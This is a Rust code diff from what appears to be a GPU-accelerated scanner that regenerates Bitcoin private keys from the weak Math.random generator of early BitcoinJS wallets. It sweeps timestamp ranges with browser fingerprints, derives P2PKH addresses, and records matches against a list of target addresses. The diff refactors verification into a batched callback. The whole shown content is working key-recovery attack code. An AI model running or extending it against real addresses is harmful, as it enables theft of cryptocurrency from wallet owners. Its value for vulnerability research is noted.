@@ -246,7 +246,7 @@ pub fn run_validate_parity(backend_str: &str, count: u64, engine_str: &str) -> R
     Ok(())
 }
 
-// ── GPU Direct Sweep (WGPU path) ─────────────────────────────────────────────
+// ── GPU Direct Sweep (WGPU path) ─────────────────────────────────────────
 
 #[cfg(feature = "wgpu")]
 fn gpu_direct_sweep_scan(
@@ -259,7 +259,7 @@ fn gpu_direct_sweep_scan(
     include_uncompressed: bool,
     fingerprints_csv:     Option<&Path>,
 ) -> Result<()> {
-    use super::wgpu_integration::{load_fingerprints, WgpuScanner};
+    use super::wgpu_integration::{load_fingerprints, WgpuScanner, GpuMatchResult};
     use crate::utils::gpu_bloom_filter::{compute_bloom_bits, GpuBloomConfig};
 
     if interval_ms == 0  { anyhow::bail!("interval_ms must be > 0"); }
@@ -268,12 +268,10 @@ fn gpu_direct_sweep_scan(
     let engine = MathRandomEngine::from_str(math_random_engine)
         .unwrap_or(MathRandomEngine::V8Mwc1616);
 
-    // Загружаем fingerprints: из CSV если задан, иначе дефолтный 1366x768
     let fingerprints = if let Some(csv) = fingerprints_csv {
         info!("\u{1f5c2}  Loading fingerprints from: {}", csv.display());
         load_fingerprints(csv, None, None, None)
-            .context("Failed to load fingerprints CSV")?;
-        load_fingerprints(csv, None, None, None)?
+            .context("Failed to load fingerprints CSV")?
     } else {
         info!("\u{26a0}\u{fe0f}  No --fingerprints-csv provided, using default single fingerprint (1366x768 cd=32 tz=0)");
         vec![super::wgpu_integration::GpuFingerprint {
@@ -290,7 +288,6 @@ fn gpu_direct_sweep_scan(
     info!("   Interval:     {} ms", interval_ms);
     info!("   Fingerprints: {}", fingerprints.len());
 
-    // Подготавливаем hash160 целей и bloom-фильтр
     let address_hashes = prepare_address_hashes(addresses)?;
 
     let bloom_cfg = GpuBloomConfig {
@@ -304,7 +301,6 @@ fn gpu_direct_sweep_scan(
         15,
     );
 
-    // Создаём WgpuScanner (fingerprints уже загружены — передаём None, т.к. используем sweep_with_fingerprints)
     let wgpu = WgpuScanner::new(
         super::config::ScanConfig::default(),
         engine,
@@ -312,71 +308,78 @@ fn gpu_direct_sweep_scan(
         true,
     ).context("Failed to initialize WGPU scanner")?;
 
-    let seed_hits = wgpu.sweep_with_fingerprints(
+    // Incremental CPU verification using sweep_with_callback
+    let secp = Secp256k1::new();
+    let addr_set: HashSet<&str> = addresses.iter().map(|s| s.as_str()).collect();
+    let mut findings = Vec::new();
+    let mut total_verified = 0usize;
+
+    wgpu.sweep_with_callback(
         start_ms,
         end_ms,
         interval_ms as u32,
         &bloom_data,
         &fingerprints,
-    )?;
+        |batch_num, total_batches, batch_results: &[GpuMatchResult]| {
+            // CPU-verify each bloom hit in this batch
+            for result in batch_results {
+                let ts = ((result.timestamp_hi as u64) << 32) | result.timestamp_lo as u64;
+                let key_bytes = BitcoinJsV013Prng::generate_privkey_bytes(ts, engine, None);
 
-    if seed_hits.is_empty() {
-        info!("\u{274c} No vulnerable addresses found in the given range.");
-        return Ok(());
-    }
+                if let Ok(sk) = SecretKey::from_slice(&key_bytes) {
+                    let pk = PublicKey::from_secret_key(&secp, &sk);
 
-    info!("\u{1f3af} Found {} GPU seed hits. Deriving addresses...", seed_hits.len());
+                    for compressed in [true, false] {
+                        if !compressed && !include_uncompressed { break; }
+                        let btc_pk = bitcoin::PublicKey { inner: pk, compressed };
+                        let addr = Address::p2pkh(&btc_pk, bitcoin::Network::Bitcoin);
+                        let addr_str = addr.to_string();
 
-    let secp = Secp256k1::new();
-    let mut findings = Vec::new();
-
-    for seed in &seed_hits {
-        let key_bytes = BitcoinJsV013Prng::generate_privkey_bytes(
-            seed.timestamp_ms, engine, None,
-        );
-
-        if let Ok(sk) = SecretKey::from_slice(&key_bytes) {
-            let pk = PublicKey::from_secret_key(&secp, &sk);
-
-            for compressed in [true, false] {
-                if !compressed && !include_uncompressed { break; }
-                let btc_pk = bitcoin::PublicKey { inner: pk, compressed };
-                let addr = Address::p2pkh(&btc_pk, bitcoin::Network::Bitcoin);
-                let addr_str = addr.to_string();
-
-                if addresses.contains(&addr_str) {
-                    info!("\u{1f511} MATCH: {} @ ts={} fp_idx={}",
-                        addr_str, seed.timestamp_ms, 0);
-                    findings.push(super::integration::VulnerabilityFinding {
-                        address: addr_str,
-                        confidence: super::integration::Confidence::High,
-                        browser_config: super::fingerprints::BrowserConfig {
-                            priority:              1,
-                            user_agent:            String::new(),
-                            screen_width:          seed.screen_width,
-                            screen_height:         seed.screen_height,
-                            color_depth:           seed.color_depth,
-                            timezone_offset:       seed.timezone_offset,
-                            language:              String::new(),
-                            platform:              String::new(),
-                            market_share_estimate: 0.0,
-                            year_min:              2011,
-                            year_max:              2016,
-                        },
-                        timestamp:       seed.timestamp_ms,
-                        derivation_path: "gpu-direct".to_string(),
-                    });
+                        if addr_set.contains(addr_str.as_str()) {
+                            info!("\u{1f511} VERIFIED MATCH: {} @ ts={}", addr_str, ts);
+                            findings.push(super::integration::VulnerabilityFinding {
+                                address: addr_str.clone(),
+                                confidence: super::integration::Confidence::High,
+                                browser_config: super::fingerprints::BrowserConfig {
+                                    priority:              1,
+                                    user_agent:            String::new(),
+                                    screen_width:          fingerprints[0].screen_width,
+                                    screen_height:         fingerprints[0].screen_height,
+                                    color_depth:           fingerprints[0].color_depth as u8,
+                                    timezone_offset:       fingerprints[0].timezone_offset as i16,
+                                    language:              String::new(),
+                                    platform:              String::new(),
+                                    market_share_estimate: 0.0,
+                                    year_min:              2011,
+                                    year_max:              2016,
+                                },
+                                timestamp:       ts,
+                                derivation_path: "gpu-verified".to_string(),
+                            });
+                            break; // Found match for this timestamp, stop checking compressed/uncompressed
+                        }
+                    }
                 }
             }
-        }
-    }
+
+            total_verified += batch_results.len();
+
+            // Progress report every 100 batches
+            if batch_num % 100 == 0 {
+                info!("\u{1f4ca} Progress: {}/{} batches | Verified hits: {} | True matches: {}",
+                    batch_num, total_batches, total_verified, findings.len());
+            }
+
+            Ok(())
+        },
+    )?;
 
     output_results(&findings, output_path)?;
-    info!("\u{2705} GPU Direct Sweep complete. Verified matches: {}", findings.len());
+    info!("\u{2705} GPU Direct Sweep complete. Total verified: {} | True matches: {}", total_verified, findings.len());
     Ok(())
 }
 
-// ── CPU Direct Sweep fallback ─────────────────────────────────────────────────
+// ── CPU Direct Sweep fallback ────────────────────────────────────────────
 
 fn direct_sweep_scan(
     addresses:            &[String],
@@ -456,7 +459,7 @@ fn direct_sweep_scan(
     Ok(())
 }
 
-// ── Helpers ───────────────────────────────────────────────────────────────────
+// ── Helpers ──────────────────────────────────────────────────────────────
 
 fn prepare_address_hashes(addresses: &[String]) -> Result<Vec<Vec<u8>>> {
     use std::str::FromStr;
